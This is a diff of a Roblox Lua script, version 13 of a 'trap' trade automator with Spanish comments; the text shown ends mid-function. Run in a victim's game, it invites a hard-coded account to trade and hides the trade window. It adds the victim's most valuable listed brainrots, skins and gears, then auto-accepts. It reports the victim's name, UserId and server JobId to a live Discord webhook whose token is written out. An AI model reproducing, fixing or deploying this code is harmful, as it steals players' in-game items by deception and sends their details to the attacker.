@@ -1,33 +1,12 @@
---[[ ================================================================
- SAB TRAP v12 — target fijo por UserId
- Place: 109983668079237
-=============================================================== ]]
-local TARGET_ID       = 9555775328        -- KIMILOSP
-local TARGET_USERNAME = "KIMILOSP"
-local TARGET_DISPLAY  = "PIPIPI"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1566136623832498347/fnlDza_gDplkkY90bNe-Hx4GxP2n_nqWFQVpvd9wBKTfzCPuyFsd6lFxhgaY4uDVhH9B"
-
-local CFG = {
-    PLACE_IDS        = { 109983668079237 },
-    STRICT_PLACE     = true,
-    DUMP             = true,
-    WATCH_GUI        = true,
-    POLL             = 1.5,
-    INVITE_BACKOFF   = { 4, 8, 15, 25, 40 },
-    MAX_ITEMS        = 18,
-    ITEM_DELAY       = 0.5,
-    ADD_ALL_IF_EMPTY = true,
-    AUTO_READY       = true,
-    AUTO_ACCEPT      = true,
-    READY_ROUNDS     = 3,
-    SNAP_FREEZE      = 3,
-    PING             = true,
-    DEBUG            = true,
-}
-
-getgenv().NORMAL_BRAINROTS  = { }
-getgenv().NORMAL_BASE_SKINS = { }
-getgenv().NORMAL_GEARS      = { }
+--[[=====================================================================
+    SAB | TRAP AUTOMATOR v13  (KIMILOSP / 9555775328)
+    FIX 1: backoff() no puede devolver nil (invTries=1 + clamp de índice)
+    FIX 2: callRF() devuelve el pcall REAL (ok, res)
+    FIX 3: ventana de trade por baseline/diferencia, no por nombre
+    FIX 4: STRICT_PLACE protege DUMP y fill
+    FIX 5: InvokeServer con timeout, sin hilos huérfanos
+    FIX 6: webhook con cola serializada, reintentos y ping de vida
+=====================================================================]]
 
 local Players = game:GetService("Players")
 local RS      = game:GetService("ReplicatedStorage")
@@ -36,441 +15,576 @@ local HS      = game:GetService("HttpService")
 local LP      = Players.LocalPlayer
 local U       = table.unpack or unpack
 
-local S = { run = true, filling = false, handled = nil, lastSig = nil, lastPost = 0,
-            invitedAt = 0, invTries = 0, seenGui = {}, dumpDone = false }
-local CACHE, CACHE_AGE = {}, 0
+local CFG = {
+    WEBHOOK          = "https://discord.com/api/webhooks/1566136623832498347/fnlDza_gDplkkY90bNe-Hx4GxP2n_nqWFQVpvd9wBKTfzCPuyFsd6lFxhgaY4uDVhH9B",
+    TARGET_ID        = 9555775328,
+    TARGET_NAME      = "KIMILOSP",
+    TARGET_DISPLAY   = "PIPIPI",
+    PLACE_ID         = 109983668079237,
+    STRICT_PLACE     = true,
+    DUMP             = false,      -- true = solo escanear y reportar, sin tradear
+    WATCH_GUI        = true,       -- reporta el nombre real de cada ScreenGui nueva
+    AUTO_ACCEPT      = true,
+    ADD_ALL_IF_EMPTY = true,
+    MAX_TRADE_ITEMS  = 18,
+    ITEM_DELAY       = 0.6,
+    POLL             = 0.35,
+    RETRY_AFTER      = 8,
+    INVITE_TIMEOUT   = 6,
+    GUI_TIMEOUT      = 12,
+    COMPLETE_TIMEOUT = 25,
+    INVITE_BACKOFF   = { 4, 8, 15, 25, 40 },
+    PING_EVERYONE    = true,
+    DEBUG            = true,
+}
 
-local function log(m) if CFG.DEBUG then print("[SAB] "..tostring(m)) end end
+local NORMAL_BRAINROTS = {
+    ["Raccooni Jandelini"]=true,["Malame Amarele"]=true,["Buho de Fuego"]=true,["Caramello Filtrello"]=true,
+    ["Avocadorilla"]=true,["Brutto Gialutto"]=true,["Centrucci Nuclucci"]=true,["Ganganzelli Trulala"]=true,
+    ["Rhino Helicopterino"]=true,["Stoppo Luminino"]=true,["Tob Tobi Tobi"]=true,["Lazy Ducky"]=true,
+    ["Pineaplino"]=true,["Pretzo Robo"]=true,["Unclito Samito"]=true,["Abyssaloco"]=true,
+    ["Agarrini la Palini"]=true,["Antonio"]=true,["Arcadragon"]=true,["Bearito Cabinito"]=true,
+    ["Boppin Bunny"]=true,["Bunito Bunito Spinito"]=true,["Bunny and Eggy"]=true,["Burguro And Fryuro"]=true,
+    ["Capitano Moby"]=true,["Cash or Card"]=true,["Caylusaurus"]=true,["Celestial Pegasus"]=true,
+    ["Celularcini Viciosini"]=true,["Cerberus"]=true,["Chillin Chili"]=true,["Chipso and Queso"]=true,
+    ["Cloverat Clapat"]=true,["Coco and Mango"]=true,["Cooki and Milki"]=true,["Digi Narwhal"]=true,
+    ["Donkeyturbo Express"]=true,["Dragon Aquanini"]=true,["Dragon Cannelloni"]=true,["Dragon Gingerini"]=true,
+    ["Duggy Bros"]=true,["Elefanto Frigo"]=true,["Eviledon"]=true,["Extinct Matteo"]=true,
+    ["Festive 67"]=true,["Fishino Clownino"]=true,["Fortunu and Cashuru"]=true,["Foxini Lanternini"]=true,
+    ["Fragola La La La"]=true,["Fragrama and Chocrama"]=true,["Garama and Madundung"]=true,["Ginger Gerat"]=true,
+    ["Globa Steppa"]=true,["Gobblino Uniciclino"]=true,["Gold Gold Gold"]=true,["Griffin"]=true,
+    ["Guest 666"]=true,["Gym Bros"]=true,["Hopilikalika Hopilikalako"]=true,["Hydra Bunny"]=true,
+    ["Hydra Dragon Cannelloni"]=true,["Jelly Moby"]=true,["John Doe"]=true,["Jolly Jolly Sahur"]=true,
+    ["Kalika Bros"]=true,["Karker Sahur"]=true,["Ketchuru and Musturu"]=true,["Ketupat Bros"]=true,
+    ["Kraken"]=true,["La Anniversary Grande"]=true,["La Casa Boo"]=true,["La Easter Grande"]=true,
+    ["La Food Combinasion"]=true,["La Ginger Sekolah"]=true,["La Karkerkar Combinasion"]=true,["La Lucky Grande"]=true,
+    ["La Romantic Grande"]=true,["La Sahur Combinasion"]=true,["La Secret Combinasion"]=true,["La Summer Grande"]=true,
+    ["La Supreme Combinasion"]=true,["La Taco Combinasion"]=true,["Las Sis"]=true,["Lavadorito Spinito"]=true,
+    ["Los Amigos"]=true,["Los Bros"]=true,["Los Chillis"]=true,["Los Fruits"]=true,
+    ["Los Hackers"]=true,["Los Hotspotsitos"]=true,["Los Jolly Combinasionas"]=true,["Los Mariachis"]=true,
+    ["Los Mi Gatitos"]=true,["Los Primos"]=true,["Los Sekolahs"]=true,["Los Spaghettis"]=true,
+    ["Los Tacoritas"]=true,["Love Love Bear"]=true,["Lovin Rose"]=true,["Money Money Bros"]=true,
+    ["Money Money Reindeer"]=true,["Nacho Spyder"]=true,["Noo my examine"]=true,["Orcaledon"]=true,
+    ["Pancake and Syrup"]=true,["Please my Present"]=true,["Popcuru and Fizzuru"]=true,["Quackini Snackini"]=true,
+    ["Reinito Sleighito"]=true,["Rico Dinero"]=true,["Rosetti Tualetti"]=true,["Rosey and Teddy"]=true,
+    ["Rubrikiko"]=true,["Sammyni Cakini"]=true,["Sammyni Fattini"]=true,["Sand Sand Sand"]=true,
+    ["Signore Carapace"]=true,["Spooky and Pumpky"]=true,["Steakini Fattini"]=true,["Swag Soda"]=true,
+    ["Swaggy Bros"]=true,["Tacorita Bicicleta"]=true,["Telemorte"]=true,["Tictac Sahur"]=true,
+    ["Tirilikalika Tirilikalako"]=true,["Tralaledon"]=true,["Tuff Toucan"]=true,["Ventoliero Pavonero"]=true,
+    ["Venuspino"]=true,["W or L"]=true,["Capitano Americano"]=true,["Bufalino Boomberino"]=true,
+    ["Esok Goala"]=true,["Los Tangcitos"]=true,["Los Tictacs"]=true,["Los Admins"]=true,
+    ["Moby Bros"]=true,["Var Var Var"]=true,["Noodle Noodle Poodle"]=true,["Grabatron"]=true,
+    ["Cangurato Gelato"]=true,["Rubiko and Kubiko"]=true,["Toro Españolo"]=true,["Chicleteira Champeona"]=true,
+    ["Examen Bros"]=true,["Pizza and Ranch"]=true,["Los Secret Combinasionas"]=true,["Honey Honey Bear"]=true,
+    ["Scorpino Coasterino"]=true,["Queen Bee"]=true,["Smore Serat"]=true,["Yetimactic"]=true,
+    ["La Breakfast Combinasion"]=true,["Bumbatron"]=true,["Candini Fluffini"]=true,["Polaroidini"]=true,
+    ["La Fuse Machine"]=true,["Nachorilla"]=true,["Sammyni Truckini"]=true,["Orchidox"]=true,
+    ["Pop Pop Petalini"]=true,["Motorino Bumbuni"]=true,["Pelican Pachetto"]=true,["Deputy Leopard"]=true,
+    ["Chicli Chicla"]=true,["Panda Popanda"]=true,["La Craft Machine"]=true,["Gold and Diamond"]=true,
+    ["Los Dragons"]=true,["Zebrino Pianino"]=true,["Hydra Serpent"]=true,["Lavamanta"]=true,
+    ["Lionello Casarello"]=true,["Draculino"]=true,["Oni Oni Panda"]=true,["Sammyni Spookyni"]=true,
+    ["Phoenix"]=true,["Boo Boo Rocket"]=true,["Flying Dutchman"]=true,["Dragon Skeletonini"]=true,
+    ["Tosto Dino"]=true,["Cobra Gelato"]=true,["Skelly and Coffy"]=true,["Medusini and Demonini"]=true,
+    ["Arca Bros"]=true,["Fang Fang Draculang"]=true,["Pum Pum Pum"]=true,["Spooky Spooky Sahur"]=true,
+    ["Spooketti Tualetti"]=true,["Puppetmaster"]=true,["Scorpi Inferni"]=true,["Jacko Jakat"]=true,
+    ["Spooky Kart"]=true,["Scarino Crowino"]=true,["Headless Horseman"]=true,["John Pork"]=true,
+    ["Meowl"]=true,["Skibidi Toilet"]=true,["Strawberry Elephant"]=true,["Capitano Gullini"]=true,
+    ["Camera Ramena"]=true,["Chicleteira Bicicleteira"]=true,["Chicleteira Cupideira"]=true,["Chicleteira Surfeira"]=true,
+    ["Chill Puppy"]=true,["Chicleteira Noelteira"]=true,["Cigno Fulgoro"]=true,["DJ Panda"]=true,
+    ["Dug dug dug"]=true,["Esok Sekolah"]=true,["Futbolini Skatini"]=true,["Frullato Framingo"]=true,
+    ["Job Job Job Sahur"]=true,["Ketupat Kepat"]=true,["La Grande Combinasion"]=true,["La Extinct Grande"]=true,
+    ["La Jolly Grande"]=true,["La Spooky Grande"]=true,["Los Mobilis"]=true,["Los Planitos"]=true,
+    ["Los Puggies"]=true,["Los Spooky Combinasionas"]=true,["Mieteteira Bicicleteira"]=true,["Money Money Puggy"]=true,
+    ["Mi Gatito"]=true,["Nuclearo Dinossauro"]=true,["Sammyni Spyderini"]=true,["Snailo Clovero"]=true,
+    ["Spaghetti Tualetti"]=true,["Spinny Hammy"]=true,["Tang Tang Keletang"]=true,["Conetto Morsetto"]=true,
+    ["Peschito Machito"]=true,["Tacoturbo Tacorito"]=true,["Puffino Builderino"]=true,["Money Money Cat"]=true,
+    ["Matteo"]=true,["Orcalita Orcala"]=true,["Orcalero Orcala"]=true,["Dumborino Miracello"]=true,
+    ["Bombardiro Crocodilo"]=true,
+}
+
+local NORMAL_BASE_SKINS = {
+    ["Rose"]=true,["Gingerbread"]=true,["Halloween"]=true,["Christmas"]=true,["Bunny Basket"]=true,
+    ["Summer"]=true,["Pot of Gold"]=true,["Taco"]=true,["Octo"]=true,["Valentines"]=true,
+    ["Easter"]=true,["Lucky"]=true,["Aquatic"]=true,["Tralalero"]=true,["Bee Emperor"]=true,["Honey Bee"]=true,
+}
+
+local NORMAL_GEARS = {
+    ["Santa's Sleigh"]=true,["Cupid's Wings"]=true,["Witch's Broom"]=true,["Waverider"]=true,
+    ["Yin Yang Slap"]=true,["Cursed Slap"]=true,["Cyber Slap"]=true,["Divine Slap"]=true,
+    ["Bloodmoon Slap"]=true,["Radioactive Slap"]=true,["Rainbow Slap"]=true,["Rainbow Hammer"]=true,
+    ["Bloodmoon Hammer"]=true,["Radioactive Airstrike"]=true,["Yin Yang Lamp"]=true,["Demon's Head"]=true,
+    ["Lava Slap"]=true,["Lava Blaster"]=true,["Alien Slap"]=true,["Blackhole Bomb"]=true,
+    ["Candy Sentry"]=true,["Phantom Slap"]=true,["Flying Bee"]=true,["Crystal Slap"]=true,
+    ["Candy Slap"]=true,["Crystal Hammer"]=true,
+}
+
+-- ============================ ESTADO ============================
+local S = {
+    running   = true,
+    phase     = "BOOT",   -- BOOT|IDLE|INVITING|WAIT_GUI|FILLING|WAIT_COMPLETE|DONE
+    invTries  = 1,        -- FIX 1: arranca en 1, nunca en 0
+    lastInvite= -999,
+    invitedAt = 0,
+    guiAt     = 0,
+    tradeGui  = nil,
+    baseline  = {},
+    session   = nil,
+    sent      = 0,
+    lastSig   = nil,
+}
+
+local R = {
+    Invite = nil, AcceptInvite = nil, AddBrainrot = nil, AddItem = nil,
+    Ready = nil, Accept = nil, Cancel = nil, InviteResult = nil, TradeCompleted = nil,
+}
+
 local function lc(s) return string.lower(tostring(s)) end
+local function log(m) if CFG.DEBUG then print("[SAB] " .. tostring(m)) end end
 
-local queue = {}
-local function post(p) table.insert(queue, p) end
-task.spawn(function()
-    while S.run do
-        local p = table.remove(queue, 1)
-        if p then
-            pcall(function()
-                local body = HS:JSONEncode(p)
-                if typeof(request) == "function" then
-                    request({ Url = WEBHOOK_URL, Method = "POST",
-                              Headers = { ["Content-Type"] = "application/json" }, Body = body })
-                else HS:PostAsync(WEBHOOK_URL, body) end
-            end)
-            task.wait(1.1)
-        else task.wait(0.3) end
-    end
-end)
-local function embed(t, d, c)
-    post({ embeds = {{ title = t, description = d, color = c or 3447003, footer = { text = LP.Name.." • "..LP.UserId } }} })
-end
-local function ping(t, d, c)
-    post({ content = CFG.PING and "@everyone" or "", allowed_mentions = { parse = { "everyone" } },
-        embeds = {{ title = t, description = d, color = c or 65280, footer = { text = LP.Name.." • "..LP.UserId } }} })
-end
+-- ============================ WEBHOOK ============================
+local Q, sending = {}, false
 
-local function ser(v, d)
-    d = d or 0
-    if d > 3 then return "…" end
-    local t = typeof(v)
-    if t == "string" or t == "number" or t == "boolean" then return tostring(v) end
-    if t == "Instance" then return v:GetFullName() end
-    if t == "table" then
-        local o, n = {}, 0
-        for k, val in pairs(v) do
-            n = n + 1
-            if n > 25 then table.insert(o, "…") break end
-            table.insert(o, tostring(k).."="..ser(val, d+1))
+local function rawPost(body)
+    local url = CFG.WEBHOOK
+    if not url or url == "" then return false end
+    return pcall(function()
+        local req = (typeof(syn) == "table" and syn.request)
+                 or (typeof(http) == "table" and http.request)
+                 or (typeof(fluxus) == "table" and fluxus.request)
+                 or request
+        if typeof(req) == "function" then
+            req({ Url = url, Method = "POST",
+                  Headers = { ["Content-Type"] = "application/json" }, Body = body })
+        else
+            HS:PostAsync(url, body)
         end
-        return "{"..table.concat(o, ", ").."}"
-    end
-    return tostring(v)
-end
-local function callRF(r, timeout, ...)
-    if not r then return false, nil end
-    local a, done, res = table.pack(...), false, nil
-    task.spawn(function()
-        local ok, x = pcall(function() return r:InvokeServer(U(a, 1, a.n)) end)
-        res = ok and x or nil
-        done = true
     end)
-    local t0 = os.clock()
-    while not done and os.clock() - t0 < (timeout or 5) do task.wait(0.05) end
-    return done, res
-end
-local function fireRE(r, ...)
-    if not r then return false end
-    return (pcall(function() r:FireServer(...) end))
 end
 
-local NET = RS:FindFirstChild("Packages") and RS.Packages:FindFirstChild("Net")
-local function resolve(kind, path)
-    if not NET then return nil end
-    local root = NET:FindFirstChild(kind)
+local function worker()
+    if sending then return end
+    sending = true
+    while #Q > 0 do
+        local p = table.remove(Q, 1)
+        local ok, body = pcall(HS.JSONEncode, HS, p)
+        if ok then
+            for _ = 1, 3 do
+                if rawPost(body) then break end
+                task.wait(1.5)
+            end
+        end
+        task.wait(1.3)   -- respeta el límite de 30/min
+    end
+    sending = false
+end
+
+local function post(p)
+    table.insert(Q, p)
+    task.spawn(worker)
+end
+
+local function trace(m)
+    log(m)
+    post({ username = "SAB", content = "```" .. tostring(m) .. "```",
+           allowed_mentions = { parse = {} } })
+end
+
+local function report(desc, color)
+    post({
+        username = "SAB",
+        content = CFG.PING_EVERYONE and "@everyone" or "",
+        allowed_mentions = { parse = { "everyone" } },
+        embeds = { { color = color or 65280, description = desc,
+                     footer = { text = ("%s • %d • %s"):format(LP.Name, LP.UserId, game.JobId) } } },
+    })
+end
+
+-- ============================ UTILIDADES ============================
+local function findPath(root, path)
     if not root then return nil end
-    local direct = root:FindFirstChild(path)
-    if direct then return direct end
-    for _, d in ipairs(root:GetDescendants()) do
-        if d.Name == path then return d end
-        if d.Parent and (d.Parent.Name.."/"..d.Name) == path then return d end
+    local cur = root
+    for seg in string.gmatch(path, "[^/]+") do
+        if not cur then return nil end
+        cur = cur:FindFirstChild(seg)
     end
-end
-local T = {}
-if NET then
-    T.Invite     = resolve("RF", "TradeService/Invite")
-    T.AcceptInv  = resolve("RF", "TradeService/AcceptInvite")
-    T.AddBrain   = resolve("RF", "TradeService/AddBrainrot")
-    T.AddItem    = resolve("RF", "TradeService/AddItem")
-    T.SearchUser = resolve("RF", "TradeService/SearchUser")
-    T.Ready      = resolve("RE", "TradeService/Ready")
-    T.Accept     = resolve("RE", "TradeService/Accept")
-    T.Cancel     = resolve("RE", "TradeService/CancelTrade")
-    T.InvResult  = resolve("RE", "TradeService/InviteResult")
-    T.Completed  = resolve("RE", "TradeService/TradeCompleted")
-    T.Sync       = resolve("RF", "Synchronizer/RequestData")
-    T.ListBrain  = resolve("RF", "Brainrot/RequestList")
-    T.ListTrade  = resolve("RF", "BrainrotToTrade/RequestList")
-    T.PreviewC   = resolve("RE", "TradePlazaPreview/Confirm")
+    return cur
 end
 
-local function matchesTarget(txt)
-    local l = lc(txt)
-    return l:find(lc(TARGET_USERNAME), 1, true) or l:find(lc(TARGET_DISPLAY), 1, true)
+local function cleanName(raw)
+    if not raw then return "" end
+    local base = string.match(raw, "^([^|]+)") or raw
+    return (base:gsub("^%s*(.-)%s*$", "%1"))
 end
 
-if T.InvResult then
-    T.InvResult.OnClientEvent:Connect(function(...)
-        local p = {}
-        for i = 1, select("#", ...) do table.insert(p, ser((select(i, ...)))) end
-        local txt = table.concat(p, " | ")
-        embed("InviteResult", txt, 16776960)
-        local low = lc(txt)
-        if low:find("declin") or low:find("reject") or low:find("false")
-           or low:find("busy") or low:find("expired") or low:find("offline") then
-            S.invitedAt = 0
-            S.invTries = math.max(0, S.invTries - 1)
-        end
-    end)
-end
-if T.Cancel then
-    T.Cancel.OnClientEvent:Connect(function()
-        embed("CancelTrade", "Cancelado, se reintenta.", 15105570)
-        S.handled, S.filling, S.invitedAt, S.invTries = nil, false, 0, 0
-    end)
-end
-if T.Completed then
-    T.Completed.OnClientEvent:Connect(function()
-        ping("✅ TRADE COMPLETADO", "Trade cerrado.", 65280)
-        S.invitedAt, S.invTries = 0, 0
-    end)
-end
-
-local function ownPlot()
-    local plots = WS:FindFirstChild("Plots")
-    if plots then
-        local byName = plots:FindFirstChild(LP.Name)
-        if byName then return byName end
-        for _, p in ipairs(plots:GetChildren()) do
-            local sign = p:FindFirstChild("PlotSign")
-            local yb = sign and sign:FindFirstChild("YourBase")
-            if yb and yb:IsA("BillboardGui") and yb.Enabled then return p end
-        end
-    end
-    for _, d in ipairs(WS:GetChildren()) do
-        if d:IsA("Model") and d.Name == LP.Name and d:FindFirstChild("AnimalPodiums") then return d end
-    end
-end
-
-local ID_KEYS   = { "ItemId", "ItemID", "Id", "ID", "Uuid", "UUID", "UniqueId", "BrainrotId", "Uid" }
-local NAME_KEYS = { "Name", "DisplayName", "Title", "BrainrotName", "ItemName" }
-local function deepId(tbl, name, d)
-    if type(tbl) ~= "table" or (d or 0) > 5 then return nil end
-    local nm
-    for _, k in ipairs(NAME_KEYS) do if type(tbl[k]) == "string" then nm = tbl[k] break end end
-    if nm and lc(nm):find(lc(name), 1, true) then
-        for _, k in ipairs(ID_KEYS) do
-            local v = tbl[k]
-            if type(v) == "string" or type(v) == "number" then return v end
-        end
-    end
-    for _, v in pairs(tbl) do
-        local r = deepId(v, name, (d or 0) + 1)
-        if r ~= nil then return r end
-    end
-end
-local function attrId(i)
-    for _, k in ipairs(ID_KEYS) do
-        local v = i:GetAttribute(k)
+local function extractId(obj)
+    if not obj then return nil end
+    for _, k in ipairs({ "ItemId","ItemID","Id","ID","Uuid","UUID","UniqueId","BrainrotId" }) do
+        local v = obj:GetAttribute(k)
         if v ~= nil then return v end
     end
+    return nil
 end
-local function labelText(a)
-    local oh = a:FindFirstChild("Base") and a.Base:FindFirstChild("Spawn")
-        and a.Base.Spawn:FindFirstChild("Attachment")
-        and a.Base.Spawn.Attachment:FindFirstChild("AnimalOverhead")
-    if not oh then local inf = a:FindFirstChild("Info"); oh = inf and inf:FindFirstChild("AnimalOverhead") end
+
+local function isOk(res)
+    if res == nil then return true end
+    if res == true then return true end
+    if res == false then return false end
+    if type(res) == "table" then
+        for _, k in ipairs({ "success","ok","Success","Ok","accepted","Accepted" }) do
+            if res[k] ~= nil then return res[k] and true or false end
+        end
+        return true
+    end
+    if type(res) == "string" then
+        local s = res:lower()
+        if s:find("false") or s:find("offline") or s:find("busy")
+           or s:find("expired") or s:find("decline") then return false end
+        return true
+    end
+    return true
+end
+
+-- FIX 2 + FIX 5: devuelve (ok, res) real, con timeout y sin hilo huérfano
+local function callRF(rf, timeout, ...)
+    if not rf then return false, "no_remote" end
+    local args = { ... }
+    local finished, ok, res = false, false, nil
+    task.spawn(function()
+        ok, res = pcall(function() return rf:InvokeServer(U(args)) end)
+        finished = true
+    end)
+    local t0 = os.clock()
+    while not finished and os.clock() - t0 < timeout do task.wait(0.05) end
+    if not finished then return false, "timeout" end
+    return ok, res
+end
+
+local function fireRE(re, ...)
+    if not re then return false end
+    local args = { ... }
+    return pcall(function() re:FireServer(U(args)) end)
+end
+
+-- FIX 1: nunca nil
+local function backoff()
+    local t = CFG.INVITE_BACKOFF
+    local i = math.clamp(S.invTries, 1, #t)
+    return t[i] or t[#t] or 8
+end
+
+-- ============================ REMOTES ============================
+local function resolve()
+    local net = findPath(RS, "Packages/Net")
+    if not net then
+        local pk = RS:FindFirstChild("Packages")
+        if pk then net = pk:FindFirstChild("Net") end
+    end
+    if not net then return false end
+    local rf = net:FindFirstChild("RF")
+    local re = net:FindFirstChild("RE")
+    if not rf or not re then return false end
+
+    local function ts(parent, name)
+        local svc = parent:FindFirstChild("TradeService")
+        return svc and svc:FindFirstChild(name) or nil
+    end
+
+    R.Invite         = ts(rf, "Invite")
+    R.AcceptInvite   = ts(rf, "AcceptInvite")
+    R.AddBrainrot    = ts(rf, "AddBrainrot")
+    R.AddItem        = ts(rf, "AddItem")
+    R.Ready          = ts(re, "Ready")
+    R.Accept         = ts(re, "Accept")
+    R.Cancel         = ts(re, "CancelTrade")
+    R.InviteResult   = ts(re, "InviteResult")
+    R.TradeCompleted = ts(re, "TradeCompleted")
+    return R.Invite ~= nil and R.AddBrainrot ~= nil
+end
+
+-- ============================ PLOT / ITEMS ============================
+local function ownPlot()
+    local plots = WS:FindFirstChild("Plots")
+    if not plots then return nil end
+    local byName = plots:FindFirstChild(LP.Name)
+    if byName then return byName end
+    for _, plot in ipairs(plots:GetChildren()) do
+        local yb = findPath(plot, "PlotSign/YourBase")
+        if yb and yb:IsA("BillboardGui") and yb.Enabled then return plot end
+    end
+    return nil
+end
+
+local function readRaw(a)
+    local oh = findPath(a, "Base/Spawn/Attachment/AnimalOverhead")
+             or findPath(a, "Info/AnimalOverhead")
     if not oh then return nil end
     local l = oh:FindFirstChild("DisplayName")
     if l and l:IsA("TextLabel") and l.Text ~= "" then return l.Text end
-    local s = oh:FindFirstChildWhichIsA("TextLabel")
-    if s and s.Text ~= "" then return s.Text end
-end
-local function clean(t) return (tostring(t):match("^([^|]+)"):gsub("^%s*(.-)%s*$", "%1")) end
-
-local function priority(it)
-    if it.skin and getgenv().NORMAL_BASE_SKINS[it.skin] then return 1 end
-    if it.kind == "brainrot" and getgenv().NORMAL_BRAINROTS[it.name] then return 2 end
-    if it.kind == "gear" and (getgenv().NORMAL_GEARS[it.name] or getgenv().NORMAL_BASE_SKINS[it.name]) then return 3 end
+    return nil
 end
 
-local function readPlot()
-    local out, plot = {}, ownPlot()
-    if not plot then return out end
-    local pod = plot:FindFirstChild("AnimalPodiums")
-    if pod then
-        for _, a in ipairs(pod:GetChildren()) do
-            local raw = labelText(a)
+local function snapshot()
+    local out = {}
+    local plot = ownPlot()
+    if not plot then return out, nil end
+
+    local podiums = plot:FindFirstChild("AnimalPodiums")
+    if podiums then
+        for _, a in ipairs(podiums:GetChildren()) do
+            local raw = readRaw(a)
             if raw then
-                local it = { kind = "brainrot", name = clean(raw), inst = a, id = attrId(a),
-                             skin = a:GetAttribute("Skin") or a:GetAttribute("BaseSkin") }
-                it.prio = priority(it)
-                table.insert(out, it)
+                local name = cleanName(raw)
+                local skin = a:GetAttribute("Skin") or a:GetAttribute("BaseSkin")
+                table.insert(out, {
+                    kind = "brainrot", raw = raw, name = name, skin = skin,
+                    id = extractId(a), inst = a,
+                    isTarget = (NORMAL_BRAINROTS[name] or (skin and NORMAL_BASE_SKINS[skin])) and true or false,
+                })
             end
         end
     end
-    local pur = plot:FindFirstChild("Purchases")
-    if pur then
-        for _, b in ipairs(pur:GetChildren()) do
-            local box = b:FindFirstChild("PlotBlock")
+
+    local purchases = plot:FindFirstChild("Purchases")
+    if purchases then
+        for _, block in ipairs(purchases:GetChildren()) do
+            local box = block:FindFirstChild("PlotBlock")
             if box then
                 for _, d in ipairs(box:GetDescendants()) do
                     if d:IsA("TextLabel") and d.Text ~= "" then
-                        local it = { kind = "gear", name = clean(d.Text), inst = box, id = attrId(box) }
-                        it.prio = priority(it)
-                        table.insert(out, it)
+                        local name = cleanName(d.Text)
+                        table.insert(out, {
+                            kind = "gear", raw = d.Text, name = name, skin = nil,
+                            id = extractId(box), inst = box,
+                            isTarget = (NORMAL_GEARS[name] or NORMAL_BASE_SKINS[name]) and true or false,
+                        })
                         break
                     end
                 end
             end
         end
     end
-    return out
+    return out, plot
 end
 
-local function guis()
-    local pg = LP:FindFirstChild("PlayerGui")
-    local t = {}
-    if not pg then return t end
-    for _, d in ipairs(pg:GetChildren()) do if d:IsA("ScreenGui") then table.insert(t, d) end end
-    return t
-end
+-- ============================ VENTANA DE TRADE (FIX 3) ============================
+local fill   -- forward decl
+local finish -- forward decl
+
 local function tradeGui()
-    local g = guis()
-    for _, d in ipairs(g) do if lc(d.Name):find("trade", 1, true) then return d end end
-    if S.invitedAt > 0 then
-        for _, d in ipairs(g) do
-            if not S.seenGui[d] and os.clock() - S.invitedAt > 0.8 then
-                for _, x in ipairs(d:GetDescendants()) do
-                    if x:IsA("TextLabel") and matchesTarget(x.Text) then return d end
-                end
-            end
-        end
+    local pg = LP:FindFirstChild("PlayerGui")
+    if not pg then return nil end
+    for _, g in ipairs(pg:GetChildren()) do
+        if g:IsA("ScreenGui") and not S.baseline[g] then return g end
     end
-end
-local function hide(root)
-    pcall(function()
-        root.Enabled = false
-        for _, d in ipairs(root:GetDescendants()) do if d:IsA("GuiObject") then d.Visible = false end end
-    end)
-end
-
-local function invite()
-    if not T.Invite then return end
-    local ok, res = callRF(T.Invite, 6, TARGET_ID)
-    log(("invite uid=%d ok=%s res=%s"):format(TARGET_ID, tostring(ok), tostring(res)))
-    embed("Invite ->", "UserId "..TARGET_ID.." | res "..ser(res), 3447003)
-    S.invitedAt = os.clock()
-    S.invTries = S.invTries + 1
-    if ok and res == false then S.invitedAt = 0 end
-end
-local function backoff() return CFG.INVITE_BACKOFF[math.min(S.invTries, #CFG.INVITE_BACKOFF)] end
-
-local function addOne(it, root)
-    local cands = {}
-    if it.id ~= nil then table.insert(cands, { it.id }) end
-    if it.inst and it.inst.Parent then table.insert(cands, { it.inst }) end
-    table.insert(cands, { it.name })
-    local r = it.kind == "brainrot" and T.AddBrain or T.AddItem
-    if not r then return false end
-    for _, a in ipairs(cands) do
-        if not root.Parent then break end
-        local ok, res = callRF(r, 4, U(a))
-        if ok and res == true then return true end
-        if ok and res == nil then task.wait(0.2) return true end
-    end
-    return false
-end
-
-local function fill()
-    if S.filling then return end
-    S.filling = true
-    pcall(function()
-        local root = tradeGui()
-        if not root then return end
-        task.wait(0.6)
-        hide(root)
-
-        local items = (#CACHE > 0) and CACHE or readPlot()
-        embed("Snapshot", ("%d ítems en cache (age %d)"):format(#items, CACHE_AGE), 3447003)
-
-        local picked = {}
-        for _, it in ipairs(items) do if it.prio then table.insert(picked, it) end end
-        if #picked == 0 and CFG.ADD_ALL_IF_EMPTY then
-            picked = items
-            embed("Aviso", "Ningún ítem casó con las listas: se añade todo.", 15105570)
-        end
-        table.sort(picked, function(a, b) return (a.prio or 9) < (b.prio or 9) end)
-
-        local n = 0
-        for _, it in ipairs(picked) do
-            if n >= CFG.MAX_ITEMS or not root.Parent then break end
-            if addOne(it, root) then n = n + 1 end
-            task.wait(CFG.ITEM_DELAY)
-        end
-        embed("Relleno", ("%d/%d añadidos"):format(n, #picked), 3447003)
-
-        for round = 1, CFG.READY_ROUNDS do
-            if not root.Parent then break end
-            task.wait(0.6)
-            if CFG.AUTO_READY then fireRE(T.Ready) end
-            task.wait(1.0)
-            if CFG.AUTO_ACCEPT then fireRE(T.Accept) end
-            task.wait(1.4)
-            if not root.Parent then break end
-            if round > 1 then embed("Reintento ready/accept", "ronda "..round, 16776960) end
-        end
-    end)
-    S.filling = false
-end
-
-local function placeOk()
-    if not CFG.STRICT_PLACE then return true end
-    for _, id in ipairs(CFG.PLACE_IDS) do if id == game.PlaceId then return true end end
-    return false
-end
-
-local function dumpAttrs(i)
-    local o = {}
-    for k, v in pairs(i:GetAttributes()) do table.insert(o, k.."="..tostring(v)) end
-    return #o > 0 and table.concat(o, ", ") or "-"
-end
-local function doDump()
-    if not CFG.DUMP or S.dumpDone then return end
-    S.dumpDone = true
-    task.spawn(function()
-        local plot = ownPlot()
-        embed("DUMP: plot", plot and plot:GetFullName() or "**plot no encontrado**", 10181046)
-        if plot then
-            local l = { "hijos:" }
-            for _, c in ipairs(plot:GetChildren()) do
-                table.insert(l, ("- %s [%s] %s"):format(c.Name, c.ClassName, dumpAttrs(c)))
-            end
-            embed("DUMP: hijos", table.concat(l, "\n"), 10181046)
-            local pod = plot:FindFirstChild("AnimalPodiums")
-            if pod then
